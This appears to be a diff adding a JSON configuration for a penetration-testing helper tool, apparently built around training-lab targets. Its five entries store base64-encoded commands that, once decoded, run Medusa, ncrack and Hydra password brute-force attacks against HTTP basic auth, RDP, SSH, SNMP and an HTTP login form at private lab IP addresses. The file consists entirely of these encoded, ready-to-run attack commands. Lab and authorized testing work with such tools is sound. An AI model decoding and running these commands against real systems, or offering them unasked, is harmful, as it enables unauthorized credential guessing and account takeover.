@@ -1,0 +1,36 @@
+{
+    "command": {
+        "medusa_http_brute": {
+            "description": "Brute force HTTP basic auth with Medusa",
+            "commands": [
+                "bWVkdXNhIC1oIDEwLjExLjEuMjE5IC11IGFkbWluIC1QIHBhc3N3b3JkLWZpbGUudHh0IC1NIGh0dHAgLW0gRElSOi9hZG1pbiAtVCAxMA=="
+            ]
+        },
+        "ncrack_rdp_brute": {
+            "description": "Brute force RDP authentication with ncrack",
+            "commands": [
+                "bmNyYWNrIC12diAtLXVzZXIgb2Zmc2VjIC1QIHBhc3N3b3JkLWZpbGUudHh0IHJkcDovLzEwLjExLjEuMzU="
+            ]
+        },
+        "hydra_ssh_brute": {
+            "description": "Brute force ssh auth with hydra",
+            "commands": [
+                "aHlkcmEgLWwgcm9vdCAtUCBwYXNzd29yZC1maWxlLnR4dCAxMC4xMS4xLjIxOSBzc2g="
+            ]
+        },
+        "hydra_snmp_brute": {
+            "description": "Brute force SNMP with hydra",
+            "commands": [
+                "aHlkcmEgLVAgcGFzc3dvcmQtZmlsZS50eHQgLXYgMTAuMTEuMS4yMTkgc25tcA=="
+            ]
+        },
+        "hydra_http_form_brute": {
+            "description": "Brute force HTTP forms with hydra",
+            "commands": [
+                "aHlkcmEgLUwgL3Vzci9zaGFyZS93b3JkbGlzdHMvbWV0YXNwbG9pdC9odHRwX2RlZmF1bHRfdXNlcnMudHh0IC1QIC91c3Ivc2hhcmUvd29yZGxpc3RzL21ldGFzcGxvaXQvaHR0cF9kZWZhdWx0X3Bhc3MudHh0IDE5Mi4xNjguOTIuMTQwIGh0dHAtZ2V0LWZvcm0gIi9sb2dpbmZvcm0uYXNwOnVuYW1lPV5VU0VSXiZwc3c9XlBBU1NeOlBsZWFzZSBsb2dpbiB0byB2aWV3IHRoZSBjb250ZW50IgpoeWRyYSAtTCAvdXNyL3NoYXJlL3dvcmRsaXN0cy9tZXRhc3Bsb2l0L2h0dHBfZGVmYXVsdF91c2Vycy50eHQgLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvZmFzdHRyYWNrLnR4dCAxOTIuMTY4LjkyLjE0MCBodHRwLWdldC1mb3JtICIvbG9naW5mb3JtLmFzcDp1bmFtZT1eVVNFUl4mcHN3PV5QQVNTXjpQbGVhc2UgbG9naW4gdG8gdmlldyB0aGUgY29udGVudCI="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
